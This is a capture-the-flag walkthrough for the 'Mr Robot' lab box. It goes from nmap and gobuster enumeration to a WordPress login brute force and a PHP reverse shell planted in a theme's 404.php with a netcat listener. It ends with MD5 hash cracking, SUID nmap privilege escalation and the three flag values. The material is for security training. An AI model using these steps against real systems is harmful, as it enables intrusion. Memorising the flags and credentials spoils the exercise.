# Mr Robot CTF

> Based on the Mr. Robot show, can you root this box?

<br>

### Process:

1. port scan:
	- `sudo nmap -T4 10.10.32.6`
	- `sudo nmap -T4 -A -p 22,80,443 10.10.32.6`
2. enumerate port 80:
	- go to website 
	- run gobuster: `gobuster dir -u http://10.10.35.131/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,bak,conf,txt,js`
	- check "robots.txt":
		- found "fsociety.dic" -- save with: `wget http://10.10.35.131/fsocity.dic`
		- found "key-1-of-3.txt"
		- key 1 = **073403c8a58a1f80d943455fb30724b9**
	- run against wpscan: `wpscan --url http://10.10.35.131`
		- found login page
		- try default credentials -- failed
	- try to brute force wordpress login on xmlrpc found and  using the dictionary found:
		- `wpcan --url http://10.10.35.131 -U admin,elliot -P fsociety.dic`
	- found on "http://10.10.35.131/license" page a base64 encrypted word:
		- decrypt it: `echo "ZWxsaW90OkVSMjgtMDY1Mgo=" | base64 -d` 
		- found credentials: "elliot:ER28-0652"
	- login to wordpress:
		- credentials worked
	- upload reverse shell: 
		- go to “Appearance > Theme Editor > 404.php” and replace the PHP code with a [PHP reverse shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell)
		- setup a netcat listener: `nc -lvnp`
		- then call the template: `http://10.10.35.131/wp-content/themes/twentyfifteen/404.php`
	3. post-exploitation:
		- stabilise shell: `python -c 'import pty;pty.spawn("/bin/sh")'` -> `export TERM=xterm` -> [Ctrl-Z] -> `stty raw -echo; fg`
		- found "password.raw-md5" in "/home/robot" directory 
			- contains: "robot:c3fcd3d76192e4007dfb496cca67e13b"
		- cracked hash = abcdefghijklmnopqrstuvwxyz
		- login to robot account: `su robot` -> [password]
		- read "key-2-of-3.txt":
			- key 2 = **822c73956184f694993bede3eb39f959**
	4. esclate privileges:
		- check for SUID/SGID binaries:
			- `find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null`
			- found nmap 
		- exploit nmap:
			- `nmap --interactive` -> `!sh`
		- get last key:
			- `cat /root/key-3-of-3.txt`
			- flag 3 = **04787ddef27c3dee1ee161b21670b4e4**